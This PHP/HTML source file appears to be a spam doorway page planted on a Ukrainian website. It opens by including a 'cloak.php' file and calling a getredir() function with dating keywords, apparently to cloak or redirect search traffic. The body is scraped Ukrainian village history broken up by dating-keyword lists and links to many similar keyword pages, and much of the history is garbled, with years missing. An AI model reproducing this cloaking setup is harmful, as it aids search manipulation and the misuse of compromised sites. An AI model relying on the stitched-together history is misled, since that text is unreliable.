<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%b2+%d0%86%d0%bd%d1%82%d0%b5%d1%80%d0%bd%d0%b5%d1%82%d1%96+%d0%b2+%d0%91%d0%b5%d1%80%d0%b5%d0%b7%d0%bd%d0%b5+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Сайт знайомств в місті Березна</title>
	<meta name="description" content="Сайт знайомств міста Березне ❤❤️ - безкоштовні онлайн знайомства з дівчатами і чоловіками, знайомство в інтернеті Березне; Березнівський" />
	<link rel="canonical" href="https://masage.od.ua/img/133/jokuk-znayomstva-v.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/133/kuz-posluga-znayomstv.php">послуга знайомств мільйонерів в Конотоп Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/240/lovyn-vikonavch-sluzhbi-znayomstv.php">виконавчі служби знайомств поблизу Яворів Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/418/lytuk-zustrch-v.php">зустрічі в Острог Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Знайомства в Інтернеті в Березне Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>З учнями займається священик Павло Травка, який читає 4 лекції в тиждень. Також подається інформація, що на хуторі Антонін дія однокласна школа, яка має 4 кімнати де навчається 33 учні і священик читає дві лекції в тиждень. За свідченнями Курильчика Петра Федоровича  р. в році, коли в селі було встановлено радянську владу, то відразу було відкрито школу.</p>
<p>Школа розміщувалась в приміщенні маєтку пана Бендика, де було виділено одну кімнату під клас. Навчання проводилось українською мовою, а вчителем була жінка, яка приїхала з Березного. Із спогадів Гаврилюк Антоніни Стахівни в році була відкрита початкова однокласна школа. Вчителькою була Вознюк Ганна Петрівна.</p>
		
			<br><ol>
			
				<li>сайти знайомств місто в Балта Україна;</li>
			
				<li>сайти старших знайомств Львів Україна.</li>
			
				<li>чесні оголошення Березне?</li>
			
			</ol>
		
	<p>В — навчальному році було відкрито другий клас. До школи ходило не дуже багато дітей тому, що тривала громадянська війна між загонами НКВС та загонами ОУН-УПА. Вчителька із хутора Ведмежа, де був один клас школи, загинула від рук бандитів, які не хотіли коритися Радянській владі. За переказами її звали Наталка, прізвище невідоме, родом вона була із Полтавщини. В — навчальному році було відкрито третій клас.</p><a id='p1'></a><h3>Навігаційне меню</h3><p>Навчання проходило в трьох сільських хатах. В школі працювало дві вчительки — Гаврилюк Антоніна Стахівна та Вознюк Антоніна Петрівна. В — навчальному році школа стала початковою — чотирикласною. В школу на роботу були направлені ще два вчителі Леопчук Іван і Юрчук Василь. Вони закінчили середню школу і одномісячні курси вчителів. Після підписання Ризького мирного договору 18 березня року між Польщею та Радянською Росією село потрапило до складу Польщі. Польське панування тривало до вересня року.</p>
		
			<br><ol>
			
				<li>агентство сватів поблизу Мелітополь Україна;</li>
			
				<li>Знайомства з дівчинами в місті Berezne | Сайт знайомств | Topface!</li>
			
				<li>З И - Інші послуги в Березне - .</li>
			
			</ol>
		
	<p>Церковні відомості говорять, що церковні землі приносять 15 тисяч марок в рік прибутку, а сама церква заробляє 20 тисяч польських марок в рік. Отже зрозуміло, що вже в році в селі були запроваджені польські гроші. Але богослужіння ведеться за православним обрядом. За переписом населення Білашівки вже в році становило чоловіки з них чоловіків та жіночого населення, а дворів було  Село в — роки відноситься до Березнівської гміни. Костопільського повіту Волинського воєводства. В році релігійні обряди в храмі Івана Богослова проводилися за православним обрядом, які здійснює Василь Карпович Закидальський.</p>
<p>У році було проведено ремонт храму, на якій було затрачено 2 тисячі злотих. Ці гроші надали жителі села. Церкву було пофарбовано. Отже, у селі була знову змінена грошова система. В році в селі нараховувалось двори та чоловіків і жінка, тобто чоловік. В році храм було застраховано на суму 4 тисячі злотих, щорічно вносилася сума 32 злотих. Священиком був Олександр Павлович Травка, який отримував злотих, а псаломщик Борис Петров злотих. Один гектар землі коштував 10 злотих. Річний дохід від церковної землі становив злотих. На церковну землю є план, який було зроблено землеміром Перо і виданий повітовим комісаром м.</p>
<p>Багатою людиною у селі був пан Бендик.</p><strong><a id='p2'></a><h2>Великий Березний Приватна садиба ЛІСКОВЕЦЬ у Великому Березному адреса, відгуки, фото, ціни </h2></strong><p>Його маєток розміщувався на пагорбі, який тепер називають Бендикова гора. Його землі знаходились на північ та на схід від села. Також панські землі були на місці сучасної школи та в південне — західній частині села. Жителі села змушені були найматися до пана тому, що прожити за рахунок своєї землі-було неможливо. Гроші важливої функції не відігравали, тому в селі в основному йшов товарообмін.</p>
<p>Коли селянин хотів придбати певні речі, він брав надлишок своєї продукції і йшов у магазин. Саме в магазині здійснювався товарообмін.</p><strong><a id='p3'></a><h2>Знайомства з дівчинами в місті Berezne</h2></strong><p>Наприклад, за один кілограм сушених грибів можна було отримати 15 марок і купити на них голку та катушку ниток. Зі спогадів Іванової Євдокії Іванівни  р. найбільші земельні володіння в селі мав пан Малинський. В село пан не приїзджав, але в нього був свій посадник на ім'я Віцьо. Життя було тяжким тому, щоб вижити селяни змушені були брати землю в оренду в пана Малинського. А під час збирання урожаю з цієї землі вони віддавали із зібраних 5 снопів жита 2 віддавали панові.</p>
<p>Та бригада, яка збирала податки низалася «мойот». Приміщення цієї бригади знаходилось в Михайлині. Керував цією бригадою пан Струк. Землі, які знаходились за річкою Комарня, називались фондовськими, тобто землі запасу. Ці землі заросли чагарниками. Селяни, у яких було мало землі, викорчовували чагарники і займалися землеробством, але ці землі були мало родючі.</p>
<p>Після посадника Віцьо землі в оренду пана Малинського взяла єврейка Нехля. Вона володіла землями до приходу німців, а коли прийшли німці то її було вбито. Паном лісовчиком лісник був Єлько Кур'ята. В його обов'язки входило: контролювати за вирубкою лісу, вказувати на ділянку для вирізування сухих дерев та слідкувати за збиранням чорниць.</p>
		
			
				<div>ЄВРОПЕЙСЬКИЙ ВЕКТОР/ старша викладачка кафедри журналістики Прикарп. університету Галина Пристай.</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/WQCxak3px8s' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Щоб отримати дозвіл на збирання чорниць потрібно було купити квитанцію. Люди, які не мали квитанції, але перебували в ліси без дозволу і займалися збиральництвом змушені були платити штрафи. Найстаршим в селі був поляк, але він був дуже жорстокий, тому його було вбито.</p>
<p>Тоді було прислали іншого поляка. Люди жили бідно, не було в що одягтись та взутися. Переважна більшість людей ходила в постолах і це було дуже незручно. Одяг був із льону, хто хотів, той міг пофарбувати. Фарбували полотно дубовою корою. У казанок наливали воду, вкидали туди дубову кору, щоб вона добре покипіла. Потім вкидали полотно, і тримали стільки, скільки потрібно для кольору. Довше — яскравіше, менше — світліше. Але на одяг ніхто не зважав, головне, щоб було що їсти.</p>
<p>На село було два магазини, які були власністю євреїв. Цим магазином володів українець на ім'я Курильчик Павло Степанович  р. В цьому магазині був значно менший асортимент товарів ніж у магазинах євреїв. Також за часів поліського панування цегельний завод належав цьому ж чоловікові Павлу. Розпочинаючи з року навколо села було створено ряд польських колоній. А зокрема: Храпачев, Хомині острови, Вороновка, Головки, Гайочки.</p>
<p>Кордон між Польщею та УРСР було встановлено між селами Червона Воля та Сівки.</p><img src="https://obyava.ua/img/classified/0/543/9389/200-vjv6mien6mmpe8mb.jpg" alt="Звичайні оголошення" style="max-width: 480px; max-height: 480px;"/><p>Коли радянські війська перейшли кордон, то польські війська не чинили опору. Тому зважаючи на невелику відстань від кордону до села Балашівка можна стверджувати, що17 вересня року в селі було встановлено радянську владу.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/377/voke-msto-onlayn-znayomstva.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/471/ceb-obdn-pobachennya-novoazovsk.php">обідні побачення Новоазовськ Україна</a></li><li><a href="https://masage.od.ua/img/137/bin-bezkoshtovniy-dodatok-dlya.php">безкоштовний додаток для знайомств Фастів Україна</a></li><li><a href="https://masage.od.ua/img/327/linyj-mo-shvidksn.php">мої швидкісні знайомства в Жовква Україна</a></li><li><a href="https://masage.od.ua/img/457/dyt-fotograf-znayomstv-v.php">фотографії знайомств в Інтернеті Гірник Україна</a></li><li><a href="https://masage.od.ua/img/313/xaf-bezkoshtovne-pdklyuchennya.php">безкоштовне підключення - - Яворів Україна</a></li><li><a href="https://masage.od.ua/img/454/novo-znayomstva-navkolo-poblizu.php">знайомства навколо поблизу Камянка Україна</a></li><li><a href="https://masage.od.ua/img/184/kevu-povniy-gachok-sinelnikove.php">повний гачок Синельникове Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#p1'>Навігаційне меню</a></li>
<li><a href='#p2'>Великий Березний Приватна садиба ЛІСКОВЕЦЬ у Великому Березному адреса, відгуки, фото, ціни </a></li>
<li><a href='#p3'>Знайомства з дівчинами в місті Berezne</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/457/leso-pdklyuchennya-dodatkv.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>